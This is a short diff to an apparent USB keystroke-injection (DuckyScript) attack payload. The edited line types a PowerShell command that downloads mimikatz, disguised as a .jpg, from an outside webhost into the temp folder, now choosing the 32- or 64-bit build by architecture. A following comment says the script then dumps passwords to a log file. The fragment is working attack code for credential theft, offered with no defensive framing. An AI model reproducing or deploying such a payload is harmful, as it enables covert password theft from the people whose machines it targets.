@@ -15,7 +15,7 @@ ALT y
 ENTER
 DELAY 300
 REM -------------download appropriate mimikatz for architecture
-STRING powershell if ([System.IntPtr]::Size -eq 4) { (new-object System.Net.WebClient).DownloadFile('https://pwningstuff.000webhostapp.com/executables/pw32.jpg','%TEMP%\pw.exe');  }else{ (new-object System.Net.WebClient).DownloadFile('https://pwningstuff.000webhostapp.com/executables/pw32.jpg','%TEMP%\pw.exe');}
+STRING powershell if ([System.IntPtr]::Size -eq 4) { (new-object System.Net.WebClient).DownloadFile('https://pwningstuff.000webhostapp.com/executables/pw32.jpg','%TEMP%\pw.exe');  }else{ (new-object System.Net.WebClient).DownloadFile('https://pwningstuff.000webhostapp.com/executables/pw64.jpg','%TEMP%\pw.exe');}
 ENTER
 DELAY 5000
 REM -------------get the passwords and save to c:\pwlog.txt
